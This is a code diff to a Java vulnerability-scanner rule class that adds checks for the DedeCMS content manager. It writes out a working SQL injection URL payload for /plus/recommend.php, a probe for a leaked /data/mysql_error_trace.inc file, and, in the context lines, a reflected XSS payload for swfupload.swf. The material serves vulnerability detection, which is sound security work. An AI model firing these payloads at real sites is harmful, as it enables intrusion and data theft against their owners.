@@ -95,7 +95,32 @@ public class SimpleVulRule extends InnerPlugin<List<Vulnerable>> {
             case $Discuz:
                 break;
             case $dedecms:
+
+                loaders.add(
+                        Payloader.builder()
+                                .url("/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\' or mid=@`\\'` /*!50000union*//*!50000select*/1,2,3,md5(1),5,6,7,8,9%23@`\\'`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=6873")
+                                .containsStr("c4ca4238a0b923820dcc509a6f75849b")
+                                .vuln(Vulnerable.builder()
+                                        .title("dedecms /plus/recommend.php SQL注入漏洞")
+                                        .level(Vulnerable.Level.HIGH.getLevel())
+                                        .type(Vulnerable.Type.SQL_INJECTION.getType())
+                                        .build())
+                                .build()
+                );
                 ///images/swfupload/swfupload.swf?movieName="])}catch(e){if(!window.x){window.x=1;alert("xss")}}//
+                loaders.add(
+                        Payloader.builder()
+                                .url("/data/mysql_error_trace.inc")
+                                .containsStr("<?php")
+                                .vuln(
+                                        Vulnerable.builder()
+                                                .title("dedecms /data/mysql_error_trace.inc 信息泄露")
+                                                .type(Vulnerable.Type.INFO_LEAKAGE.getType())
+                                                .level(Vulnerable.Level.HIGH.getLevel())
+                                                .build()
+                                )
+                                .build()
+                );
                 loaders.add(
                         Payloader.builder()
                                 .url("/images/swfupload/swfupload.swf?movieName=\"])}catch(e){if(!window.x){window.x=1;alert(\"xss\")}}//")
@@ -197,10 +222,10 @@ public class SimpleVulRule extends InnerPlugin<List<Vulnerable>> {
                                     @Override
                                     public boolean fun(HttpResponse response) throws Exception {
                                         String body = response.body();
-                                        if (body==null)
+                                        if (body==null || response.getStatusCode() != 200)
                                             return false;
 
-                                        if (StringUtils.containsAny(body," for ","config","admin","install"))
+                                        if (StringUtils.containsAny(body.toLowerCase(),"system","upload","manage","config","admin","install"))
                                             return true;
                                         return false;
                                     }
